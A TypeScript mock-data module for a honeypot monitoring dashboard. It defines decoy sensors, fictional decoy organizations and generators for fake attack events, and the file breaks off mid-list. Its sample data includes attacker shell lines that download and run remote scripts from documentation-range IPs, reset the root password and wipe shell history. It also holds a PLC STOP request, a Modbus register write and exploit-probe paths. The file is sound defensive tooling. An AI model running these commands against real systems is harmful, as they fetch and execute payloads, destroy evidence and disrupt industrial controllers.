// The sensor fleet as the real deployment runs it: the same sensor names
// (`event.sensor`), protocols, listening ports and native field shapes the
// shipped documents carry, and each sensor's share of the traffic squashed
// (square root of its real 30-day volume) so the small sensors still have
// something to show next to cowrie.
//
// Each sensor writes its own `fields` (the `honeypot.*` object as that
// sensor emits it) and is normalized into one of the dashboard's event
// types for the cross-sensor views. The reading spec (what it is, which of
// its fields make columns, which one is the artefact worth running it for)
// follows the real dashboard's per-sensor protocol table.
//
// Addresses are documentation ranges and hostnames are example.test; field
// names and value shapes come from the real documents, values do not.
import type { EventType, FieldValue, SensorFields, Severity } from '../types'
import { hex, int, pick, pickSkewed } from './random'
import type { Rng } from './random'

export type { FieldValue, SensorFields }

/** What a sensor's generator returns for one event. */
export type EventDraft = {
  type: EventType
  severity: Severity
  protocol: string
  dstPort: number
  /** The sensor's own event name (`eventid`, `event`, `origin`, …). */
  eventName: string
  summary: string
  fields: SensorFields
  username?: string
  password?: string
  command?: string
}

/** A field, or the first of several names different versions use for it. */
export type FieldRef = string | string[]

export type SensorColumn = { header: string; field: FieldRef; mono?: boolean; badge?: 'danger' | 'warning' | 'success' | 'muted' | 'info' }

export type SensorSpec = {
  id: string
  /** The family, as operators name it. */
  kind: string
  /** One phrase: what this sensor is and what it captures. */
  what: string
  protocols: string[]
  ports: Array<{ proto: 'tcp' | 'udp'; port: number }>
  ingress: Array<'portbridge' | 'traefik' | 'direct'>
  /** Mock events in the last 24 hours. */
  perDay: number
  status: 'online' | 'degraded' | 'offline'
  /** Minutes since its newest event. */
  lastSeenMinutes: number
  /** Columns beyond the time / source / port every sensor shares. */
  columns: SensorColumn[]
  /** The characteristic artefact: the thing worth running the sensor for. */
  artefacts: Array<{ label: string; field: FieldRef }>
  /** Leaderboards over its own fields. */
  tops: Array<{ label: string; field: FieldRef }>
  /** The quantities it exists to produce. */
  measures: Array<{ label: string; match: (fields: SensorFields, type: EventType) => boolean }>
  /** The decoy identity this sensor wears, if it wears one. */
  persona?: Persona
  generate: (rng: Rng, session: string) => EventDraft
}

/** A decoy identity: a fictional organization, one of its sites, and the
 * emulated assets there. `share` is the fraction of the sensor's events
 * that carry it (dionaea wears one on only part of its services). */
export type Persona = { id: string; organization: string; site: string; assets: string[]; share?: number; assetFor?: (fields: SensorFields) => string }

// The fictional organizations the fleet impersonates. Invented for the mock;
// the deployment's own cover identities never appear in this public repo.
const VOLTARIS = 'Voltaris AI Labs GmbH'
const KESTREL = 'Kestrel Retail Group Ltd.'
const AUENWASSER = 'Auenwasser Municipal Water'
const HAFENRING = 'Hafenring Logistics AG'
const FERNWAERME = 'Fernwärme Süd'
const BRUECKENFUEL = 'Brückenfuel Service GmbH'
const WESERCHEM = 'Weserchem Process AG'
const MOORLAND = 'Moorland Grid Distribution'

export const USERNAMES = ['root', 'admin', 'ubuntu', 'user', 'test', 'oracle', 'pi', 'postgres', 'git', 'support', 'guest', 'ftpuser'] as const
export const PASSWORDS = ['123456', 'admin', 'password', 'root', '12345678', 'qwerty', '1234', 'P@ssw0rd', 'raspberry', 'admin123', 'toor', '111111'] as const
export const COMMANDS = [
  'uname -a',
  'cat /proc/cpuinfo | grep name | wc -l',
  'cd /tmp; wget http://198.51.100.23/bins.sh; chmod +x bins.sh; ./bins.sh',
  'echo "root:Xk2j9" | chpasswd',
  'nproc',
  'ls -la ~/.ssh',
  'free -m',
  'crontab -l',
  'curl -s http://203.0.113.9/x | sh',
  'history -c; rm -rf ~/.bash_history',
] as const

const SCANNER_AGENTS = [
  'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'Mozilla/5.0 zgrab/0.x',
  'python-requests/2.31.0',
  'curl/8.4.0',
  'Go-http-client/1.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
] as const

const SSH_CLIENTS = ['SSH-2.0-Go', 'SSH-2.0-libssh2_1.10.0', 'SSH-2.0-OpenSSH_8.9p1', 'SSH-2.0-PuTTY_Release_0.81', 'SSH-2.0-paramiko_3.4.0'] as const
const HASSHES = ['0a07365cc01fa9fc82608ba4019af499', 'b5752e36ba6c5979a575e43178908adf', 'ec7378c1a92f5a8dde7e8b7a1ddf33d1', '92674389fa1e47a27ddd8d9b63ecd42b'] as const

const uuid = (rng: Rng) => `${hex(rng, 8)}-${hex(rng, 4)}-4${hex(rng, 3)}-a${hex(rng, 3)}-${hex(rng, 12)}`
const is = (type: EventType, ...types: EventType[]) => types.includes(type)
const has = (field: string) => (fields: SensorFields) => field in fields && fields[field] !== ''
const eq = (field: string, ...values: string[]) => (fields: SensorFields) => values.includes(String(fields[field]))

// ---- Families shared by several sensors -------------------------------------

type HttpLikeOptions = { port: number; proto: 'http' | 'https'; paths: Array<[string, Severity]>; host?: string }

/** An emulated web appliance: method, path, headers, a user agent. */
function httpLike(rng: Rng, { port, proto, paths, host }: HttpLikeOptions): EventDraft {
  const [path, severity] = pickSkewed(rng, paths)
  const method = rng() < 0.9 ? 'GET' : 'POST'
  const userAgent = pickSkewed(rng, SCANNER_AGENTS)
  return {
    type: 'http.request',
    severity,
    protocol: proto,
    dstPort: port,
    eventName: method.toLowerCase(),
    summary: `${method} ${path}`,
    fields: {
      event: method.toLowerCase(),
      method,
      path,
      proto,
      port,
      user_agent: userAgent,
      headers: { Accept: '*/*', 'User-Agent': userAgent, ...(host ? { Host: host } : {}), Connection: 'close' },
      canonical_fingerprint: userAgent,
      canonical_fingerprint_kind: 'User-Agent',
      canonical_attck_techniques: severity === 'high' ? ['T1190'] : ['T1595'],
    },
  }
}

type ConpotRequest = { dataType: string; port: number; request: string; response: string; eventType: string; summary: string }

/** One emulated industrial device: connect, a request and its reply, disconnect. */
function conpotEvent(rng: Rng, requests: ConpotRequest[]): EventDraft {
  const roll = rng()
  const req = pickSkewed(rng, requests)
  const base = { sensorid: 'conpot', data_type: req.dataType, dst_port: req.port, id: uuid(rng), canonical_attck_techniques: ['T0886'] }
  if (roll < 0.35) return { type: 'connection', severity: 'info', protocol: req.dataType, dstPort: req.port, eventName: 'NEW_CONNECTION', summary: `${req.dataType} connection`, fields: { ...base, event_type: 'NEW_CONNECTION' } }
  if (roll < 0.55) return { type: 'connection', severity: 'info', protocol: req.dataType, dstPort: req.port, eventName: 'CONNECTION_LOST', summary: `${req.dataType} connection closed`, fields: { ...base, event_type: 'CONNECTION_LOST' } }
  return {
    type: 'protocol.request',
    severity: req.eventType.includes('write') || req.eventType.includes('STOP') ? 'high' : 'medium',
    protocol: req.dataType,
    dstPort: req.port,
    eventName: req.eventType,
    summary: req.summary,
    fields: { ...base, event_type: req.eventType, request: req.request, response: req.response },
  }
}

const MODBUS = (port: number): ConpotRequest => ({ dataType: 'modbus', port, eventType: 'read_holding_registers', request: "b'48420000000602039c410001'", response: "b'03020000'", summary: 'Modbus read holding registers 40001' })
const MODBUS_WRITE = (port: number): ConpotRequest => ({ dataType: 'modbus', port, eventType: 'write_single_register', request: "b'0a1c00000006010600010001'", response: "b'0a1c00000006010600010001'", summary: 'Modbus write single register 40002' })
const S7 = (port: number): ConpotRequest => ({ dataType: 's7comm', port, eventType: 'szl_read', request: "b'0300001f02f080320700000100000800080001120411440100ff09000400110001'", response: "b'CPU 1214C DC/DC/DC'", summary: 'S7 read SZL 0x0011 (module identification)' })

const CONPOT_SPEC = {
  kind: 'Conpot',
  what: 'Industrial control protocol: the request an attacker sent and the response the emulated device served',
  ingress: ['portbridge'] as SensorSpec['ingress'],
  status: 'online' as const,
  columns: [
    { header: 'protocol', field: 'data_type', badge: 'info' as const },
    { header: 'event', field: 'event_type', mono: true },
  ],
  artefacts: [
    { label: 'Request', field: 'request' },
    { label: 'Response served', field: 'response' },
  ],
  tops: [
    { label: 'protocols', field: 'data_type' },
    { label: 'requests', field: 'event_type' },
  ],
  measures: [
    { label: 'connections', match: eq('event_type', 'NEW_CONNECTION') },
    { label: 'requests answered', match: has('request') },
  ],
}

// ---- The fleet ----------------------------------------------------------------

export const FLEET: SensorSpec[] = [
  {
    id: 'cowrie',
    persona: { id: 'voltaris-gpu02', organization: VOLTARIS, site: 'voltaris-munich-ml', assets: ['gpu02'] },
    kind: 'Cowrie',
    what: 'SSH and telnet sessions: the credentials tried and the commands run',
    protocols: ['ssh', 'telnet'],
    ports: [
      { proto: 'tcp', port: 2222 },
      { proto: 'tcp', port: 2223 },
    ],
    ingress: ['portbridge'],
    perDay: 850,
    status: 'online',
    lastSeenMinutes: 0,
    columns: [
      { header: 'event', field: 'eventid', mono: true },
      { header: 'protocol', field: 'protocol' },
      { header: 'what happened', field: 'message' },
    ],
    artefacts: [{ label: 'Session line', field: 'message' }],
    tops: [
      { label: 'usernames', field: 'username' },
      { label: 'passwords', field: 'password' },
      { label: 'commands', field: 'input' },
      { label: 'client versions', field: 'version' },
    ],
    measures: [
      { label: 'login attempts', match: (_, t) => is(t, 'login.failed', 'login.success') },
      { label: 'successful logins', match: (_, t) => t === 'login.success' },
      { label: 'commands run', match: (_, t) => t === 'command.input' },
      { label: 'files downloaded', match: (_, t) => t === 'file.download' },
    ],
    generate: (rng, session): EventDraft => {
      // One protocol per session: telnet for ~60% of sessions, as live.
      const protocol = parseInt(session.slice(0, 2), 16) < 154 ? 'telnet' : 'ssh'
      const dstPort = protocol === 'telnet' ? 2223 : 2222
      const base = { session, protocol, dst_port: dstPort, src_port: int(rng, 1024, 65535) }
      const roll = rng()
      if (roll < 0.5) {
        const username = pickSkewed(rng, USERNAMES)
        const password = pickSkewed(rng, PASSWORDS)
        const ok = roll > 0.44
        const eventid = ok ? 'cowrie.login.success' : 'cowrie.login.failed'
        const message = `login attempt [${username}/${password}] ${ok ? 'succeeded' : 'failed'}`
        return { type: ok ? 'login.success' : 'login.failed', severity: ok ? 'medium' : 'low', protocol, dstPort, eventName: eventid, summary: `${ok ? 'Login accepted' : 'Failed login'} ${username}/${password}`, username, password, fields: { ...base, eventid, username, password, message, canonical_user: username, canonical_pass: password, canonical_attck_techniques: ['T1110'] } }
      }
      if (roll < 0.74) {
        const command = pickSkewed(rng, COMMANDS)
        const risky = /wget|curl|chpasswd|rm -rf/.test(command)
        return { type: 'command.input', severity: risky ? 'high' : 'medium', protocol, dstPort, eventName: 'cowrie.command.input', summary: command, command, fields: { ...base, eventid: 'cowrie.command.input', input: command, message: `CMD: ${command}`, canonical_attck_techniques: risky ? ['T1105'] : ['T1082'] } }
      }
      if (roll > 0.985) {
        const shasum = hex(rng, 64)
        const url = pick(rng, ['http://198.51.100.23/bins.sh', 'http://203.0.113.9/x', 'http://192.0.2.44/mips'])
        return { type: 'file.download', severity: 'critical', protocol, dstPort, eventName: 'cowrie.session.file_download', summary: `Payload fetched (sha256 ${shasum.slice(0, 12)}…)`, fields: { ...base, eventid: 'cowrie.session.file_download', url, shasum, outfile: `var/lib/cowrie/downloads/${shasum}`, message: `Downloaded URL (${url}) with SHA-256 ${shasum}`, canonical_attck_techniques: ['T1105'] } }
      }
      if (protocol === 'ssh' && roll < 0.79) {
        const version = pickSkewed(rng, SSH_CLIENTS)
        return { type: 'connection', severity: 'info', protocol, dstPort, eventName: 'cowrie.client.version', summary: `Client ${version}`, fields: { ...base, eventid: 'cowrie.client.version', version, message: `Remote SSH version: ${version}`, canonical_fingerprint: version, canonical_fingerprint_kind: 'SSH client' } }
      }
      if (protocol === 'ssh' && roll < 0.84) {
        // One HASSH per client library, so the same tool matches across sources.
        const hassh = pickSkewed(rng, HASSHES)
        return { type: 'connection', severity: 'info', protocol, dstPort, eventName: 'cowrie.client.kex', summary: `Key exchange (HASSH ${hassh.slice(0, 12)}…)`, fields: { ...base, eventid: 'cowrie.client.kex', hassh, hasshAlgorithms: 'curve25519-sha256,ecdh-sha2-nistp256;aes128-ctr,aes256-ctr;hmac-sha2-256;none', message: `SSH client hassh fingerprint: ${hassh}` } }
      }
      if (protocol === 'telnet' && roll < 0.84) {
        const option = pick(rng, ['NAWS', 'TTYPE', 'ECHO', 'SGA'])
        return { type: 'connection', severity: 'info', protocol, dstPort, eventName: 'cowrie.telnet.option', summary: `Telnet WONT ${option}`, fields: { ...base, eventid: 'cowrie.telnet.option', option_name: option, command: 'WONT', message: `Telnet WONT ${option}` } }
      }
      return { type: 'connection', severity: 'info', protocol, dstPort, eventName: 'cowrie.session.connect', summary: `${protocol.toUpperCase()} connection opened`, fields: { ...base, eventid: 'cowrie.session.connect', message: `New connection [session: ${session}]` } }
    },
  },
  {
    id: 'multipot',
    persona: { id: 'voltaris-core', organization: VOLTARIS, site: 'voltaris-munich-core', assets: ['ops-vnc-01', 'mail01', 'build01', 'es-logs-01', 'edge-proxy01'], assetFor: (f) => ({ vnc: 'ops-vnc-01', pop3: 'mail01', imap: 'mail01', docker: 'build01', elasticsearch: 'es-logs-01', socks5: 'edge-proxy01' })[String(f.proto)] ?? 'ops-vnc-01' },
    kind: 'Multipot',
    what: 'Low-interaction catch-all: the bytes a client sent before anything answered',
    protocols: ['vnc', 'pop3', 'imap', 'docker', 'elasticsearch', 'socks5'],
    ports: [
      { proto: 'tcp', port: 5900 },
      { proto: 'tcp', port: 110 },
      { proto: 'tcp', port: 143 },
      { proto: 'tcp', port: 2375 },
      { proto: 'tcp', port: 9200 },
      { proto: 'tcp', port: 1080 },
    ],
    ingress: ['portbridge'],
    perDay: 480,
    status: 'online',
    lastSeenMinutes: 0,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'protocol', field: 'proto', badge: 'info' },
      { header: 'client', field: 'client' },
    ],
    artefacts: [{ label: 'Captured bytes', field: 'data' }],
    tops: [
      { label: 'protocols', field: 'proto' },
      { label: 'client banners', field: 'client' },
      { label: 'passwords', field: 'password' },
    ],
    measures: [
      { label: 'handshakes', match: eq('event', 'handshake') },
      { label: 'auth attempts', match: eq('event', 'auth_attempt') },
      { label: 'commands', match: eq('event', 'command', 'http_request') },
    ],
    generate: (rng, session): EventDraft => {
      const [proto, port] = pickSkewed(rng, [
        ['vnc', 5900],
        ['vnc', 5900],
        ['pop3', 110],
        ['imap', 143],
        ['docker', 2375],
        ['elasticsearch', 9200],
        ['socks5', 1080],
      ] as const)
      const base = { session, proto, port }
      const roll = rng()
      if (roll < 0.35) return { type: 'connection', severity: 'info', protocol: proto, dstPort: port, eventName: 'connect', summary: `${proto.toUpperCase()} connection`, fields: { ...base, event: 'connect' } }
      if (roll < 0.6) {
        const client = proto === 'vnc' ? pick(rng, ['RFB 003.003', 'RFB 003.008', 'RFB 003.007']) : proto === 'socks5' ? 'SOCKS5 no-auth' : `${proto} client`
        return { type: 'connection', severity: 'info', protocol: proto, dstPort: port, eventName: 'handshake', summary: `Handshake ${client}`, fields: { ...base, event: 'handshake', client, canonical_fingerprint: client, canonical_fingerprint_kind: 'client banner', canonical_attck_techniques: ['T1595'] } }
      }
      if (proto === 'docker' || proto === 'elasticsearch') {
        const path = proto === 'docker' ? pick(rng, ['/containers/json', '/v1.41/containers/create', '/images/json', '/version']) : pick(rng, ['/_cat/indices', '/_search?q=*', '/_nodes'])
        const method = path.includes('create') ? 'POST' : 'GET'
        return { type: 'http.request', severity: path.includes('create') ? 'high' : 'low', protocol: proto, dstPort: port, eventName: 'http_request', summary: `${method} ${path}`, fields: { ...base, event: 'http_request', method, path, data: `${method} ${path} HTTP/1.1\r\nHost: 192.0.2.10:${port}\r\n\r\n` } }
      }
      if (roll < 0.9) {
        const password = pickSkewed(rng, PASSWORDS)
        const username = proto === 'vnc' ? undefined : pickSkewed(rng, USERNAMES)
        return { type: 'login.failed', severity: 'low', protocol: proto, dstPort: port, eventName: 'auth_attempt', summary: `${proto.toUpperCase()} auth ${username ? `${username}/` : ''}${password}`, username, password, fields: { ...base, event: 'auth_attempt', ...(username ? { username } : {}), password, canonical_attck_techniques: ['T1110'] } }
      }
      const line = proto === 'pop3' ? 'USER admin' : proto === 'imap' ? 'a1 LOGIN admin admin' : 'CONNECT 198.51.100.7:25'
      return { type: 'command.input', severity: 'medium', protocol: proto, dstPort: port, eventName: 'command', summary: line, command: line, fields: { ...base, event: 'command', data: line } }
    },
  },
  {
    id: 'dionaea',
    persona: { id: 'kestrel-legacy', organization: KESTREL, site: 'kestrel-leeds-dc1', assets: ['legacy-svc-03'], share: 0.3 },
    kind: 'Dionaea',
    what: 'Service emulation: SMB, FTP, MSSQL, MySQL, SIP and PPTP exchanges, and the malware they drop',
    protocols: ['smb', 'sip', 'ftp', 'mssql', 'pptp', 'msrpc', 'mysql'],
    ports: [
      { proto: 'tcp', port: 445 },
      { proto: 'udp', port: 5060 },
      { proto: 'tcp', port: 21 },
      { proto: 'tcp', port: 1433 },
      { proto: 'tcp', port: 1723 },
      { proto: 'tcp', port: 135 },
      { proto: 'tcp', port: 3306 },
    ],
    ingress: ['portbridge'],
    perDay: 390,
    status: 'online',
    lastSeenMinutes: 1,
    columns: [
      { header: 'what', field: 'origin', mono: true },
      { header: 'protocol', field: ['connection.protocol'], badge: 'info' },
    ],
    artefacts: [{ label: 'Captured exchange', field: ['ftp', 'credentials', 'file', 'connection'] }],
    tops: [
      { label: 'services', field: 'connection.protocol' },
      { label: 'usernames', field: 'canonical_user' },
      { label: 'events', field: 'origin' },
    ],
    measures: [
      { label: 'SMB sessions', match: (f) => (f.connection as { protocol?: string } | undefined)?.protocol === 'smbd' },
      { label: 'logins tried', match: has('credentials') },
      { label: 'binaries captured', match: (_, t) => t === 'file.download' },
    ],
    generate: (rng): EventDraft => {
      const [service, port, transport, protocol] = pickSkewed(rng, [
        ['smbd', 445, 'tcp', 'smb'],
        ['smbd', 445, 'tcp', 'smb'],
        ['SipSession', 5060, 'udp', 'sip'],
        ['ftpd', 21, 'tcp', 'ftp'],
        ['mssqld', 1433, 'tcp', 'mssql'],
        ['pptpd', 1723, 'tcp', 'pptp'],
        ['epmapper', 135, 'tcp', 'msrpc'],
        ['mysqld', 3306, 'tcp', 'mysql'],
      ] as const)
      const connection = { protocol: service, transport, type: 'accept' }
      const roll = rng()
      if (service === 'smbd' && roll > 0.93) {
        const md5hash = hex(rng, 32)
        return { type: 'file.download', severity: 'critical', protocol, dstPort: port, eventName: 'dionaea.download.complete', summary: `SMB dropped binary (md5 ${md5hash.slice(0, 12)}…)`, fields: { origin: 'dionaea.download.complete', connection, file: { md5hash, url: 'smb://198.51.100.40/share/svchost.exe' }, dst_port: port } }
      }
      if (service === 'smbd' && roll > 0.75) {
        return { type: 'ids.alert', severity: 'high', protocol, dstPort: port, eventName: 'dionaea.modules.python.smb.dcerpc.request', summary: 'SMB DCERPC request matching EternalBlue MS17-010', fields: { origin: 'dionaea.modules.python.smb.dcerpc.request', connection, dcerpc: { opnum: 0, uuid: '4b324fc8-1670-01d3-1278-5a47bf6ee188' }, dst_port: port } }
      }
      if ((service === 'ftpd' || service === 'mssqld' || service === 'mysqld') && roll > 0.3) {
        const username = service === 'mssqld' ? pick(rng, ['sa', 'admin', 'sa']) : pickSkewed(rng, USERNAMES)
        const password = pickSkewed(rng, PASSWORDS)
        return {
          type: 'login.failed',
          severity: 'low',
          protocol,
          dstPort: port,
          eventName: `dionaea.modules.python.${protocol}.login`,
          summary: `${protocol.toUpperCase()} login ${username}/${password}`,
          username,
          password,
          fields: { origin: `dionaea.modules.python.${protocol}.login`, connection, credentials: [{ username, password }], canonical_user: username, canonical_pass: password, canonical_attck_techniques: ['T1110'], ...(service === 'ftpd' ? { ftp: { commands: [{ command: 'USER', arguments: [username] }, { command: 'PASS', arguments: [password] }] } } : {}), dst_port: port },
        }
      }
      if (service === 'SipSession') {
        return { type: 'protocol.request', severity: 'low', protocol, dstPort: port, eventName: 'dionaea.modules.python.sip.command', summary: `SIP ${pick(rng, ['OPTIONS', 'REGISTER', 'INVITE'])} probe`, fields: { origin: 'dionaea.modules.python.sip.command', connection: { ...connection, protocol: 'SipCall' }, dst_port: port } }
      }
      return { type: 'connection', severity: 'info', protocol, dstPort: port, eventName: 'dionaea.connection.tcp.accept', summary: `${protocol.toUpperCase()} connection accepted`, fields: { origin: `dionaea.connection.${transport}.accept`, connection, dst_port: port } }
    },
  },
  {
    id: 'cisco-asa-honeypot',
    persona: { id: 'voltaris-asa-vpn', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['asagw01'] },
    kind: 'Cisco ASA',
    what: 'HTTP requests against an emulated Cisco ASA VPN portal, plus IKE on UDP 500',
    protocols: ['https', 'ike'],
    ports: [
      { proto: 'tcp', port: 8443 },
      { proto: 'udp', port: 500 },
    ],
    ingress: ['portbridge'],
    perDay: 150,
    status: 'online',
    lastSeenMinutes: 1,
    columns: [
      { header: 'request', field: ['path', 'url'], mono: true },
      { header: 'event', field: 'event', mono: true },
      { header: 'user agent', field: 'user_agent' },
    ],
    artefacts: [{ label: 'Headers', field: 'headers' }],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'user agents', field: 'user_agent' },
    ],
    measures: [
      { label: 'portal requests', match: eq('proto', 'https') },
      { label: 'IKE exchanges', match: eq('proto', 'ike') },
    ],
    generate: (rng): EventDraft => {
      if (rng() < 0.08) {
        const event = pick(rng, ['ike_sa_init', 'ike_unexpected_exchange', 'ike_malformed'])
        return { type: 'protocol.request', severity: 'low', protocol: 'ike', dstPort: 500, eventName: event, summary: `IKE ${event.replace('ike_', '').replace('_', ' ')}`, fields: { event, proto: 'ike', port: 500 } }
      }
      return httpLike(rng, {
        port: 8443,
        proto: 'https',
        paths: [
          ['/', 'low'],
          ['/+CSCOE+/logon.html', 'medium'],
          ['/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua', 'high'],
          ['/+webvpn+/index.html', 'medium'],
        ],
      })
    },
  },
  {
    ...CONPOT_SPEC,
    id: 'conpot',
    persona: { id: 'auenwasser-s7-200', organization: AUENWASSER, site: 'auenwasser-intake', assets: ['plc-intake-01'] },
    protocols: ['snmp', 'modbus', 's7comm', 'enip', 'bacnet', 'ipmi'],
    ports: [
      { proto: 'udp', port: 161 },
      { proto: 'tcp', port: 502 },
      { proto: 'tcp', port: 102 },
      { proto: 'tcp', port: 44818 },
      { proto: 'udp', port: 47808 },
      { proto: 'udp', port: 623 },
    ],
    perDay: 125,
    lastSeenMinutes: 2,
    generate: (rng): EventDraft =>
      conpotEvent(rng, [
        { dataType: 'snmp', port: 161, eventType: 'get', request: 'GetRequest 1.3.6.1.2.1.1.1.0', response: 'Siemens, SIMATIC, S7-200', summary: 'SNMP get sysDescr' },
        MODBUS(502),
        S7(102),
        { dataType: 'enip', port: 44818, eventType: 'list_identity', request: "b'63000000'", response: '1756-EN2T/D', summary: 'EtherNet/IP ListIdentity' },
        { dataType: 'bacnet', port: 47808, eventType: 'who_is', request: "b'810b000c0120ffff00ff1008'", response: 'I-Am device 1234', summary: 'BACnet Who-Is' },
        { dataType: 'ipmi', port: 623, eventType: 'get_channel_auth', request: "b'0600ff07'", response: 'auth: md5, password', summary: 'IPMI Get Channel Auth Capabilities' },
      ]),
  },
  {
    id: 'sentrypeer',
    persona: { id: 'hafenring-pbx', organization: HAFENRING, site: 'hafenring-dispatch', assets: ['pbx-trunk-01'] },
    kind: 'SentryPeer',
    what: 'SIP / VoIP fraud probing: the SIP request exactly as it arrived',
    protocols: ['sip'],
    ports: [{ proto: 'udp', port: 5060 }],
    ingress: ['portbridge'],
    perDay: 110,
    status: 'online',
    lastSeenMinutes: 1,
    columns: [
      { header: 'method', field: 'sip_method', mono: true },
      { header: 'called number', field: 'called_number', mono: true },
      { header: 'user agent', field: ['sip_user_agent', 'user_agent'] },
    ],
    artefacts: [{ label: 'SIP message', field: 'sip_message' }],
    tops: [
      { label: 'methods', field: 'sip_method' },
      { label: 'called numbers', field: 'called_number' },
      { label: 'user agents', field: 'sip_user_agent' },
    ],
    measures: [
      { label: 'SIP requests', match: has('sip_method') },
      { label: 'call attempts (INVITE)', match: eq('sip_method', 'INVITE') },
    ],
    generate: (rng): EventDraft => {
      const method = pickSkewed(rng, ['OPTIONS', 'OPTIONS', 'REGISTER', 'INVITE'])
      const called = method === 'INVITE' ? pick(rng, ['00972597123456', '011441234567890', '900441234567890', '+37052012345']) : pick(rng, ['100', '1000', 'sentrypeer', 'admin'])
      const agent = pickSkewed(rng, ['friendly-scanner', 'sipvicious', 'sipcli/v1.8', 'Asterisk PBX 16.0.0', 'NOT_FOUND'])
      const sip_message = `${method} sip:${called}@192.0.2.10 SIP/2.0\r\nVia: SIP/2.0/UDP 198.51.100.61:5060;branch=z9hG4bK-${hex(rng, 8)}\r\nFrom: <sip:${int(rng, 100, 999)}@198.51.100.61>;tag=${hex(rng, 6)}\r\nTo: <sip:${called}@192.0.2.10>\r\nUser-Agent: ${agent}\r\nContent-Length: 0\r\n`
      return { type: 'protocol.request', severity: method === 'INVITE' ? 'medium' : 'low', protocol: 'sip', dstPort: 5060, eventName: method, summary: `SIP ${method} ${called}`, fields: { app_name: 'sentrypeer', app_version: '4.0.6', protocol: 'SIP', transport_type: 'UDP', sip_method: method, called_number: called, sip_user_agent: agent, user_agent: agent, sip_message, collected_method: 'responsive', event_uuid: uuid(rng) } }
    },
  },
  {
    ...CONPOT_SPEC,
    id: 'conpot-kamstrup',
    persona: { id: 'fernwaerme-kamstrup', organization: FERNWAERME, site: 'fernwaerme-loop-ost', assets: ['heatmeter-ost-0117'] },
    what: 'Kamstrup smart-meter emulation: meter register reads and management-protocol commands',
    protocols: ['kamstrup_protocol', 'kamstrup_management_protocol'],
    ports: [
      { proto: 'tcp', port: 1025 },
      { proto: 'tcp', port: 50100 },
    ],
    perDay: 105,
    lastSeenMinutes: 1,
    generate: (rng): EventDraft =>
      conpotEvent(rng, [
        { dataType: 'kamstrup_protocol', port: 1025, eventType: 'register_read', request: "b'80103f1001003c3c0d'", response: 'register 60: 1482.3 kWh', summary: 'Kamstrup read register 60 (energy)' },
        { dataType: 'kamstrup_management_protocol', port: 50100, eventType: 'help', request: 'H\r\n', response: 'Available commands: !AC !AS !GC !GV !SA !SB …', summary: 'Kamstrup management H (help)' },
      ]),
  },
  {
    id: 'hellpot',
    persona: { id: 'kestrel-legacy-web', organization: KESTREL, site: 'kestrel-legacy-infra', assets: ['web-legacy-02'] },
    kind: 'HellPot',
    what: 'Tarpit: how long a crawler stayed and how many bytes it swallowed',
    protocols: ['http'],
    ports: [{ proto: 'tcp', port: 8090 }],
    ingress: ['traefik'],
    perDay: 95,
    status: 'online',
    lastSeenMinutes: 4,
    columns: [
      { header: 'request', field: ['path', 'URL'], mono: true },
      { header: 'bytes sent', field: 'BYTES' },
      { header: 'held for', field: 'DURATION' },
      { header: 'user agent', field: ['user_agent', 'USERAGENT'] },
    ],
    artefacts: [{ label: 'What the sensor recorded', field: 'message' }],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'user agents', field: 'user_agent' },
    ],
    measures: [
      { label: 'crawlers trapped', match: eq('message', 'NEW') },
      { label: 'sessions ended', match: has('BYTES') },
    ],
    generate: (rng): EventDraft => {
      const path = pickSkewed(rng, ['/wp-login.php', '/.env', '/robots.txt', '/admin/', '/.git/config', '/xmlrpc.php'])
      const agent = pickSkewed(rng, SCANNER_AGENTS)
      const base = { URL: path, path, USERAGENT: agent, user_agent: agent, protocol: 'HTTP', DST_PORT: '8090' }
      if (rng() < 0.5) return { type: 'http.request', severity: 'low', protocol: 'http', dstPort: 8090, eventName: 'NEW', summary: `GET ${path}`, fields: { ...base, level: 'info', message: 'NEW' } }
      const bytes = int(rng, 20_000, 90_000_000)
      const seconds = int(rng, 2, 3_600)
      return { type: 'http.request', severity: 'low', protocol: 'http', dstPort: 8090, eventName: 'FINISH', summary: `Tarpitted ${path} for ${seconds}s (${Math.round(bytes / 1024)} KB)`, fields: { ...base, level: 'info', message: 'FINISH', BYTES: bytes, DURATION: `${seconds}s` } }
    },
  },
  {
    ...CONPOT_SPEC,
    id: 'conpot-s7-1200',
    persona: { id: 'auenwasser-s7-1200', organization: AUENWASSER, site: 'auenwasser-treatment', assets: ['plc-filter-01'] },
    what: 'Siemens S7-1200 PLC emulation: S7comm and Modbus against a small controller',
    protocols: ['modbus', 's7comm'],
    ports: [
      { proto: 'tcp', port: 1502 },
      { proto: 'tcp', port: 1102 },
    ],
    perDay: 95,
    lastSeenMinutes: 1,
    generate: (rng): EventDraft => conpotEvent(rng, [MODBUS(1502), S7(1102), MODBUS_WRITE(1502), { ...S7(1102), eventType: 'cpu_STOP', request: "b'0300002102f0803201000000050010'", response: "b'job accepted'", summary: 'S7 PLC STOP request' }]),
  },
  {
    ...CONPOT_SPEC,
    id: 'conpot-guardian',
    persona: { id: 'brueckenfuel-guardian', organization: BRUECKENFUEL, site: 'brueckenfuel-station-017', assets: ['tankmon-017'] },
    what: 'Guardian AST tank-gauge emulation: the fuel inventory commands a scanner sends',
    protocols: ['guardian_ast'],
    ports: [{ proto: 'tcp', port: 10001 }],
    perDay: 90,
    lastSeenMinutes: 3,
    generate: (rng): EventDraft =>
      conpotEvent(rng, [
        { dataType: 'guardian_ast', port: 10001, eventType: 'AST I20100', request: "b'\\x01I20100\\r\\n'", response: 'I20100\nSEP 23, 2026  8:14 AM\n\nFUEL STATION 017\n\nIN-TANK INVENTORY\n\nTANK PRODUCT   VOLUME TC VOLUME ULLAGE HEIGHT WATER TEMP\n  1  UNLEADED   6512      6490   3488  49.12  0.00 18.9', summary: 'Guardian AST I20100 (in-tank inventory)' },
        { dataType: 'guardian_ast', port: 10001, eventType: 'AST S60201', request: "b'\\x01S60201TEST\\r\\n'", response: 'S60201\nTANK 1 NAME CHANGED', summary: 'Guardian AST S60201 (rename tank)' },
      ]),
  },
  {
